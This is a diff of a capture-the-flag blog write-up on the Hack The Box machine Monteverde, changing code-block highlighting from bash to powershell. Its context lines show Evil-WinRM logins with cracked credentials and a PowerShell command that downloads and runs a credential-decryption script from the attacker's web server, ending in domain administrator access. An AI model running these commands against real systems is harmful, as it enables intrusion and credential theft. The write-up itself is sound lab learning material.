@@ -439,7 +439,7 @@ cat azure.xml
 
 And with that, I had user credentials! As I always do, once I have credentials on a Windows machine I attempted to login with <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">Evil-WinRM</a>. This is an evil implenetation of the Windows Remote Management tool. It allows attackers to log into computers and provides a lot of features for testers to use, including the ability to quickly upload and download files. I logged in, and was able to own user on the box:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 evil-winrm -i 10.10.10.172 -u mhope -p 4n0therD4y@n0th3r$
 
 *Evil-WinRM* PS C:\Users\mhope\Documents> whoami
@@ -523,7 +523,7 @@ Write-Host ("Password: " + $password.Password)
 
 And with my script ready, I had to transfer it to Monteverde. In the directory that the azure_decrypt_msol.ps1 script was located in, I spun up a quick python web server. Once hosted, on Monteverde I downloaded the file with PowerShell, and ran the script:
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 *Evil-WinRM* PS C:\Users\mhope\Documents> invoke-webrequest -uri http://10.10.14.13/azure_decrypt_msol.ps1 -outfile azureread_cred.ps1
 *Evil-WinRM* PS C:\Users\mhope\Documents> ./azureread_cred.ps1
 Domain: MEGABANK.LOCAL
@@ -533,7 +533,7 @@ Password: d0m@in4dminyeah!
 
 And finally, now that I had administrator credentials, I logged in with Evil-WinRM and rooted monteverde!
 
-{% highlight bash linenos %}
+{% highlight powershell linenos %}
 evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
 
 Evil-WinRM shell v2.1
